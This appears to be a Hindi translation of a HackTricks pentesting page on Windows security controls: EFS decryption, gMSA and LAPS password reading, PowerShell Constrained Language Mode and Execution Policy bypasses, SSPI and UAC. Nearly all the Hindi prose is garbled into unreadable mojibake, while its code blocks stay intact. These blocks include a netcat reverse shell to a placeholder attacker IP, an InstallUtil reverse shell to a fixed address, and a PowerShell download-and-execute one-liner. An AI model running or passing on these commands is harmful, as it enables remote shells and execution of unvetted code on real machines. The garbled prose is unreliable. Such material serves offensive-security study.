рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдиреЗ **рдЗрд╕ рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛** рд╣реИ, рдЗрд╕ рдкрде рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

рд╕рд╛рдЗрдлрд░ /c \<file>\ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓ рдХреЗ **рдкрд╣реБрдВрдЪ** рд╡рд╛рд▓реЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
рдЖрдк рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ `cipher /e` рдФрд░ `cipher /d` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рднреА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдФрд░ **рдбрд┐рдХреНрд░рд┐рдкреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### EFS рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛

#### Authority System рд╣реЛрдирд╛

рдЗрд╕ рддрд░реАрдХреЗ рдореЗрдВ **рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ **рд╣реЛрд╕реНрдЯ** рдореЗрдВ **рдЪрд▓ рд░рд╣реЗ** рдПрдХ **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдпрджрд┐ рдРрд╕рд╛ рд╣реИ, рддреЛ `meterpreter` рд╕рддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЯреЛрдХрди рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (`incognito` рдХреЗ `impersonate_token` рд╕реЗ)ред рдпрд╛ рдЖрдк рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ `migrate` рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЬрд╛рдирдирд╛

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## рд╕рдореВрд╣ рдкреНрд░рдмрдВрдзрд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ (gMSA)

рдЕрдзрд┐рдХрд╛рдВрд╢ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдореЗрдВ, рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ "рдкрд╛рд╕рд╡рд░реНрдб рдХрднреА рдирд╣реАрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛" рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рд╛рде рдЖрдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рд╣реЛрддреЗ рд╣реИрдВред рдЗрди рдЦрд╛рддреЛрдВ рдХрд╛ рд░рдЦрд░рдЦрд╛рд╡ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдореБрд╕реАрдмрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реАрд▓рд┐рдП рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдиреЗ **рдкреНрд░рдмрдВрдзрд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ** рдкреЗрд╢ рдХрд┐рдП рд╣реИрдВ:

* рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдмрдВрдзрди рдирд╣реАрдВред рдЗрд╕рдореЗрдВ рдПрдХ рдЬрдЯрд┐рд▓, рдпрд╛рджреГрдЪреНрдЫрд┐рдХ, 240-рд╡рд░реНрдгрдХрд╛рд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрдм рдпрд╣ рдбреЛрдореЗрди рдпрд╛ рдХрдВрдкреНрдпреВрдЯрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╕рдорд╛рдкреНрддрд┐ рддрд┐рдерд┐ рддрдХ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдмрджрд▓ рдЬрд╛рддрд╛ рд╣реИред
* рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдХреА рдХреБрдВрдЬреА рд╡рд┐рддрд░рдг рд╕реЗрд╡рд╛ (KDC) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ gMSA рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рдмрдирд╛рдиреЗ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддреА рд╣реИред
* рдпрд╣ рд▓реЙрдХ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рдФрд░ рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд▓реЙрдЧрд┐рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
* рдХрдИ рд╣реЛрд╕реНрдЯреЛрдВ рдХреЗ рдмреАрдЪ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ
* рд╢реЗрдбреНрдпреВрд▓ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдкреНрд░рдмрдВрдзрд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рд╢реЗрдбреНрдпреВрд▓ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ)
* рд╕рд░рд▓реАрдХреГрдд SPN рдкреНрд░рдмрдВрдзрди - рдпрджрд┐ рдХрдВрдкреНрдпреВрдЯрд░ рдХреЗ sAMaccount рд╡рд┐рд╡рд░рдг рдпрд╛ DNS рдирд╛рдо рдЧреБрдг рдкрд░рд┐рд╡рд░реНрддрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рддреЛ рд╕рд┐рд╕реНрдЯрдо рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ SPN рдорд╛рди рдХреЛ рдмрджрд▓ рджреЗрдЧрд╛ред

gMSA рдЦрд╛рддреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдПрдХ LDAP рдЧреБрдг рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ _**msDS-ManagedPassword**_ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ DC рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╣рд░ 30 рджрд┐рди рдореЗрдВ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд░реАрд╕реЗрдЯ рд╣реЛрддреЗ рд╣реИрдВ, **рдЕрдзрд┐рдХреГрдд рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ** рдФрд░ **рд╕рд░реНрд╡рд░реЛрдВ** рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рди рдкрд░ рд╡реЗ рд╕
```
/GMSAPasswordReader --AccountName jkohler
```
рдЗрд╕ [рд╡реЗрдм рдкреЗрдЬ](https://cube0x0.github.io/Relaying-for-gMSA/) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдЬреЛ рдмрддрд╛рддреА рд╣реИ рдХрд┐ **NTLM рд░рд┐рд▓реЗ рд╣рдорд▓рд╛** рдХреИрд╕реЗ рдХрд░реЗрдВ рдФрд░ **gMSA** рдХреЗ **рдкрд╛рд╕рд╡рд░реНрдб** рдХреЛ **рдкрдврд╝реЗрдВ**ред

## LAPS

\*\*\*\*[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) рдЖрдкрдХреЛ рдбреЛрдореЗрди-рдЬреБрдбрд┐рдВрдб рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдкрд░ **рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╛рд╕рд╡рд░реНрдб** (рдЬреЛ **рдпрд╛рджреГрдЪреНрдЫрд┐рдХ**, рдЕрджреНрд╡рд┐рддреАрдп рдФрд░ **рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдмрджрд▓рддрд╛ рд╣реИ**) рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпреЗ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдВрдЯреНрд░рд▓реА рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ ACLs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЛ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреА рдЬрд╛рддреА рд╣реИрдВ рддреЛ рдЖрдк рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell \*\*\*\* [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **рдмрд╣реБрдд рд╕рд╛рд░реА рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЛ рдмрдВрдж рдХрд░ рджреЗрддрд╛ рд╣реИ** рдЬреЛ PowerShell рдХреЛ рдкреНрд░рднрд╛рд╡реА рддрд░реАрдХреЗ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕реЗ COM рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рдирд╛, рд╕реНрд╡реАрдХреГрдд .NET рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЛ рд╣реА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛, XAML-рдЖрдзрд╛рд░рд┐рдд рд╡рд░реНрдХрдлрд╝реНрд▓реЛ, PowerShell рдХрдХреНрд╖рд╛рдПрдВ, рдФрд░ рдЕрдзрд┐рдХред

### **рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### рдмрд╛рдИрдкрд╛рд╕
```powershell
#Easy bypass
Powershell -version 2
```
рд╡рд░реНрддрдорд╛рди Windows рдореЗрдВ рдпрд╣ Bypass рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛, рд▓реЗрдХрд┐рди рдЖрдк [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
**рдЗрд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ** **рдПрдХ рд╕рдВрджрд░реНрдн рдЬреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ** -> _рдмреНрд░рд╛рдЙрдЬрд╝_ -> _рдмреНрд░рд╛рдЙрдЬрд╝_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` рдЬреЛрдбрд╝реЗрдВ рдФрд░ **рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ .Net4.5 рдореЗрдВ рдмрджрд▓реЗрдВ**ред

#### рд╕реАрдзрд╛ Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓:

```bash
nc -e /bin/sh <attacker_ip> <attacker_port>
```

рдпрд╣рд╛рдВ `<attacker_ip>` рдФрд░ `<attacker_port>` рдХреЛ рдЖрдкрдХреЗ рдЖрдХреНрд░рдордХ рдХрд╛ IP рдкрддрд╛ рдФрд░ рдкреЛрд░реНрдЯ рд╕рдВрдЦреНрдпрд╛ рд╕реЗ рдмрджрд▓реЗрдВред
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
рдЖрдк [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдпрд╛ [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ **Powershell** рдХреЛрдб рдХреЛ рдирд┐рд╖рд┐рджреНрдз рдореЛрдб рдХреЛ рдЫреЛрдбрд╝рдХрд░ рдЪрд▓рд╛ рд╕рдХреЗрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Execution Policy

рдЗрд╕реЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **restricted** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдиреАрддрд┐ рдХреЛ рдЫреЛрдбрд╝рдиреЗ рдХреЗ рдкреНрд░рдореБрдЦ рддрд░реАрдХреЗ:
```powershell
1┬║ Just copy and paste inside the interactive PS console
2┬║ Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3┬║ Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4┬║ Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5┬║ Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6┬║ Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7┬║ Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8┬║ Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9┬║ Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

## рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд░реНрдерди рдкреНрд░рджрд╛рддрд╛ рдЗрдВрдЯрд░рдлреЗрд╕ (SSPI)

рдпрд╣ рдПрдкреАрдЖрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

SSPI рдЙрди рджреЛ рдорд╢реАрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реЛрдЧрд╛ рдЬреЛ рд╕рдВрд╡рд╛рдж рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдердорд┐рдХ рд╡рд┐рдзрд┐ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЗрд░рдмреЗрд░реЛрд╕ рд╣реЛрддрд╛ рд╣реИред рдлрд┐рд░ SSPI рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреМрди рд╕рд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд░реНрдерди рдкреНрд░рджрд╛рддрд╛ (SSP) рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрдиреНрд╣реЗрдВ рдкреНрд░рддреНрдпреЗрдХ Windows рдорд╢реАрди рдХреЗ рднреАрддрд░ рдПрдХ DLL рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рджреЛрдиреЛрдВ рдорд╢реАрдиреЛрдВ рдХреЛ рд╕рдорд░реНрдерди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рд╕рдВрд╡рд╛рдж рд╕рдВрднрд╡ рд╣реЛ рд╕рдХреЗред

### рдореБрдЦреНрдп SSPs

* **рдХреЗрд░рдмреЗрд░реЛрд╕**: рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рд╡рд╛рд▓рд╛
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** рдФрд░ **NTLMv2**: рд╕рдВрдЧрддрддрд╛ рдХрд╛рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: рд╡реЗрдм рд╕рд░реНрд╡рд░ рдФрд░ LDAP, MD5 рд╣реИрд╢ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL рдФрд░ TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреА рд╡рд╛рд░реНрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдХреЗрд░рдмреЗрд░реЛрд╕ рдпрд╛ NTLM, рдХреЗрд░рдмреЗрд░реЛрд╕ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реЛрддрд╛ рд╣реИ)
* %windir%\Windows\System32\lsasrv.dll

#### рд╡рд╛рд░реНрддрд╛ рдореЗрдВ рдХрдИ рд╡рд┐рдзрд┐рдпрд╛рдБ рдпрд╛ рдХреЗрд╡рд▓ рдПрдХ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред

## UAC - рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдирд┐рдпрдВрддреНрд░рдг

[рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдирд┐рдпрдВрддреНрд░рдг (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ **рдЙрдЪреНрдЪрддрдо рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рдорддрд┐ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ**ред

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдмрдирд╛рдПрдВ рдФрд░ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВ**, рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рд╛рдореБрджрд╛рдпрд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рдХреА рдЬрд╛рдП? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред**

</details>
